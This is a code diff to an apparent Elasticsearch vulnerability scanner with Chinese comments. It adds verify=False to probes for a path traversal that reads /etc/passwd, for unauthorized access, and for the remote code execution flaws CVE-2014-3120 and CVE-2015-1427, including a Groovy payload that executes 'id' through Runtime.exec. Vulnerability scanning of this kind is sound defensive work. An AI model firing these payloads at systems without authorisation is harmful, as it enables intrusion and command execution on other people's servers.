@@ -26,7 +26,8 @@ def p9200(portdic):
 
 def dirTravlesal(url): #ElasticSearch目录遍历漏洞
     try:
-        req = requests.get('http://'+url+':9200/_plugin/head/../../../../../../../../../etc/passwd', timeout=5)
+        requests.packages.urllib3.disable_warnings()
+        req = requests.get('http://'+url+':9200/_plugin/head/../../../../../../../../../etc/passwd', timeout=5,verify=False)
         if req.status_code == 200:
             print(Vcolors.RED + "存在ElasticSearch目录遍历漏洞" + Vcolors.ENDC)
             a = url+":9200:存在ElasticSearch目录遍历漏洞"
@@ -38,8 +39,9 @@ def dirTravlesal(url): #ElasticSearch目录遍历漏洞
 
 def remoteCodeExe(url):      #CVE-2014-3120    远程命令执行
     try:
+        requests.packages.urllib3.disable_warnings()
         headers = {'Content-Type':'application/x-www-form-urlencoded'}
-        req = requests.post('http://'+url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建
+        req = requests.post('http://'+url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5,verify=False)  # es 中至少存在一条数据, so, 创建
         # print(req.text)  # {"_index":"website","_type":"blog","_id":"gyLnhuVzSBGc9sN1g4v8iQ","_version":1,"created":true}
         data ={
                 "size": 1,
@@ -58,7 +60,7 @@ def remoteCodeExe(url):      #CVE-2014-3120    远程命令执行
                 }
             }
 
-        req = requests.post('http://'+url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)
+        req = requests.post('http://'+url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5,verify=False)
         if req.status_code == 200:
             print(Vcolors.RED + "存在CVE-2014-3120 ElasticSearch远程命令执行"+ Vcolors.ENDC)
             a = url+":9200:存在CVE-2014-3120 ElasticSearch远程命令执行"
@@ -70,11 +72,12 @@ def remoteCodeExe(url):      #CVE-2014-3120    远程命令执行
 
 def remoteCodeExe1(url):      #CVE-2015-1427
     try:
+        requests.packages.urllib3.disable_warnings()
         headers = {'Content-Type':'application/x-www-form-urlencoded'}
-        req1 = requests.post('http://'+url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建
+        req1 = requests.post('http://'+url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5,verify=False)  # es 中至少存在一条数据, so, 创建
 
         data = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
-        req = requests.post('http://'+url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)
+        req = requests.post('http://'+url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5,verify=False)
 
         if req.status_code == 200:
             print(Vcolors.RED + "存在CVE-2015-1427 ElasticSearch远程命令执行" + Vcolors.ENDC)
@@ -87,7 +90,8 @@ def remoteCodeExe1(url):      #CVE-2015-1427
 
 def esUnauto(url):
     try:
-        response = requests.get('http:/'+url+":9200/_cat",timeout =5)
+        requests.packages.urllib3.disable_warnings()
+        response = requests.get('http:/'+url+":9200/_cat",timeout =5,verify=False)
         if "/_cat/master" in response.content:
             print(Vcolors.RED + "存在ElasticSearch未授权访问漏洞" + Vcolors.ENDC)
             a = url+":9200:存在ElasticSearch未授权访问漏洞"
